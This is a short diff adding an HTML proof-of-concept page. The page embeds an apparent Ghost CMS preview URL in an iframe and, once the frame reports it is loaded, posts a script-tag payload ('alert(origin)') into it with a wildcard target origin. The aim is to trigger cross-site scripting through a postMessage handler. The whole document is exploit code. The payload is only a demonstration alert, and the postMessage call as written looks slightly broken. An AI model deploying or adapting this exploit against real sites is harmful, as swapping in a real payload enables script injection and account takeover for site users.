@@ -1,0 +1,9 @@
+<iframe name="iframe" src="https://blahblah/ghost/preview"></iframe>
+<script>
+window.addEventListener('message', (event) => {
+  if (event.data === 'loaded') {
+    const payload = 'alert(origin)';
+    iframe.postMessage(`<script>${payload}<\x2fscript>`, '*');
+  }
+});
+</script>
